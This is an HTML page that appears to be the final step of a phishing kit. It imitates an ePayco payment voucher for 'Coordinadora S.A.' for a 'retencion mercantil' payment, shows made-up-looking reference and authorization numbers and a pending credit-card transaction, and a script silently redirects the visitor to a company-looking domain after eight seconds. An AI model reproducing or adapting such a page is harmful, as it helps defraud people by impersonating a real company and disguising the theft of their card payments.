<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Voucher de Pago</title>
  <link rel="stylesheet" href="finish.css">
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
</head>
<body>
  <div class="voucher">
    <div class="top-banner">
      <div class="avatar"></div>
      <div class="info">
        <div class="title">Coordinadora S.A.</div>
        <div class="desc">Pago de retencion mercantil</div>
      </div>
    </div>

    <div class="status success">
      <span>Transacción Pendiente</span>
    </div>

    <div class="details">
      <div class="row"><span >Ref ePayco</span><span class="value">282387162</span></div>
      <div class="row"><span >Ref Comercio</span><span class="value">1700000001103098156</span></div>
      <div class="row"><span >Nro de Recibo</span><span class="value">1147139-1746719256-08165</span></div>
      <div class="row"><span >Autorización</span><span class="value">TR2508154729017WLvmv</span></div>
      <div class="row1"><span >Medio de pago</span><span class="value">Tarjeta de Credito</span></div>
    </div>

    <div class="footer">
      <button>Finalizar</button>
    </div>
  </div>

  <script>
        // Función para redirigir después de un período de tiempo
        function redireccionar() {
            setTimeout(function() {
                // Cambiar la URL de la página
                window.location.href = "https://www.coordinadorausa.com/";
            }, 8000); // 2000 milisegundos = 2 segundos
        }

        // Llamar a la función de redireccionamiento al cargar la página
        window.onload = redireccionar;
    </script>
</body>
</body>
</html>
